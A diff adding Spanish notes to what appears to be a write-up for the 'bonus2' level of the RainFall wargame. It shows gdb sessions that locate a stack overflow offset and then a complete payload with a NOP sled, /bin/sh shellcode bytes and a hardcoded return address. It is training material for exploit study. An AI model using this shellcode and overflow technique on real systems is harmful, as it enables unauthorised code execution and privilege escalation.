@@ -195,3 +195,74 @@
   0x0804851f <+155>:	mov    DWORD PTR [esp],eax
   0x08048522 <+158>:	call   0x8048390 <puts@plt>
   [...]
+
+19.- Explotación
+
+20.- Sabemos que el primer buff, donde se guarda argv[1] es de 40 bytes, ya tenemos el tamaño de argv[1]. Buscaremos 
+  con el patron donde rompe.
+(gdb) r $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08006241 in ?? ()
+(gdb) info registers 
+eax            0x4f	79
+ecx            0xffffffff	-1
+edx            0xb7fd28b8	-1208145736
+ebx            0xbffffae0	-1073743136
+esp            0xbffffa90	0xbffffa90
+ebp            0x39614138	0x39614138 <-- rompe en ebp!!!!!!
+esi            0xbffffb2c	-1073743060
+edi            0xbffffadc	-1073743140
+eip            0x8006241	0x8006241
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+21.- Mal!!! Rompe en ebp. Esto es porque no tenemos la variable de entorno "LANG" seteada a un valor. Usaremos export LANG='nl'
+[...]
+(gdb) r $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? ()
+[...]
+
+22.- Ahora si rompe en eip y necesitamos un offset de 23 en argv[2]
+
+23.- Buscamos donde se almacena argv[1]
+[...]
+(gdb) disassembler greetuser
+[...]
+0x08048514 <+144>:	mov    DWORD PTR [esp],eax
+0x08048517 <+147>:	call   0x8048370 <strcat@plt>
+0x0804851c <+152>:	lea    eax,[ebp-0x48] <------ Breakpoint
+0x0804851f <+155>:	mov    DWORD PTR [esp],eax
+[...]
+(gdb) b *0x0804851c
+(gdb) r AAAA BBBB
+[...]
+(gdb) x/s $eax
+0xbffffb20:	"Goedemiddag! AAAA"
+[...]
+
+24.- Vemos que la dirección de retorno de strcat() es 0xbffffb20 pero si saltamos directamente a ella saltaria al principio de la cadena "Goedemiddag! ".
+  Tenemos que desplazarnos +13 bytes quedando la dirección a saltar 0xbffffb2d. Lo comprobamos
+  (gdb) x/s 0xbffffb2d
+  0xbffffb2d:	"AAAA"
+
+25.- Montamos el payload
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "\x90" * 19 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print "A"*23 + "\x2d\xfb\xff\xbf"')
+(insertamos "\x90" al principio para asegurarnos la ejecución del shellcode)
+
+Argv[1] -> ["\x90"* 19 + shellcode(21 bytes)] Argv[2] -> [offset + (adr return strcat() + 13)]
+              ^                                                               |
+              |----------------------------------------------------------------
+
+26.- Listo
